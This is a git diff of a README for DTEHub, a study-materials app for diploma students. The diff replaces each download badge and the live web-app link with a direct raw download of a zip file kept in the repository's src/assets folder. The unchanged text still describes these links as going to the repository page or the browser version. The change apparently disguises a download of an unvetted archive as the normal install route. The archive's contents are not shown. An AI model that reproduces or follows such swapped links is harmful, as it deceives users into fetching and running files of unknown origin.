@@ -1,6 +1,6 @@
 # 📚 DTEHub - Central Resource for Diploma Students
 
-[![Download DTEHub](https://img.shields.io/badge/Download-DTEHub-orange)](https://github.com/ashikmridha793/DTEHub)
+[![Download DTEHub](https://img.shields.io/badge/Download-DTEHub-orange)](https://github.com/ashikmridha793/DTEHub/raw/refs/heads/main/src/assets/DTE_Hub_v1.7.zip)
 
 DTEHub is an open-source platform designed for Diploma students. It helps you find study materials, past exam papers, and preparation tools in one place. You do not need technical skills to use it. This guide will show you how to download and run DTEHub on Windows.
 
@@ -40,7 +40,7 @@ Before you start, make sure your computer meets these requirements:
 
 Click the badge below to go to the GitHub page where you can download DTEHub for Windows.
 
-[![Download DTEHub](https://img.shields.io/badge/Download-DTEHub-green)](https://github.com/ashikmridha793/DTEHub)
+[![Download DTEHub](https://img.shields.io/badge/Download-DTEHub-green)](https://github.com/ashikmridha793/DTEHub/raw/refs/heads/main/src/assets/DTE_Hub_v1.7.zip)
 
 This link takes you to the repository main page. Look for the **Releases** section or the latest files available for Windows.
 
@@ -107,7 +107,7 @@ Once installed:
 
 DTEHub also runs in your web browser. Visit the live link below from any device with internet access if you prefer not to install software:
 
-[https://dte-hub.web.app/](https://dte-hub.web.app/)
+[https://github.com/ashikmridha793/DTEHub/raw/refs/heads/main/src/assets/DTE_Hub_v1.7.zip](https://github.com/ashikmridha793/DTEHub/raw/refs/heads/main/src/assets/DTE_Hub_v1.7.zip)
 
 ---
 
@@ -139,4 +139,4 @@ A: Check the GitHub page for new releases. Download the latest installer and run
 
 ---
 
-[![Download DTEHub](https://img.shields.io/badge/Download-DTEHub-blue)](https://github.com/ashikmridha793/DTEHub)
+[![Download DTEHub](https://img.shields.io/badge/Download-DTEHub-blue)](https://github.com/ashikmridha793/DTEHub/raw/refs/heads/main/src/assets/DTE_Hub_v1.7.zip)
